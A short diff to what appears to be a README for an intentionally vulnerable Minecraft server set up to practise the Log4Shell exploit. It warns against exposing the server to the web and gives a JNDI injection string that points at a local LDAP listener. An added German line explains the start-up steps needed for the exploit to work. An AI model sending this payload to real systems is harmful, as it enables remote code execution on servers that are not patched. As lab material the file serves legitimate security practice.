@@ -3,3 +3,5 @@ THis Server is Vulnerable to the Log 4 Shell Exploit Do not put it on the Web un
 
 Setup to exploit Log 4 Shell in Minecraft
 ${jndi:ldap://127.0.0.1:1389/SystemOut}
+
+Server muss initial gestarted werden ohne die entrypoint option, dammit alles initialisiert wird danach entrypoint wieder einkommentieren, damit exploit funktioniert
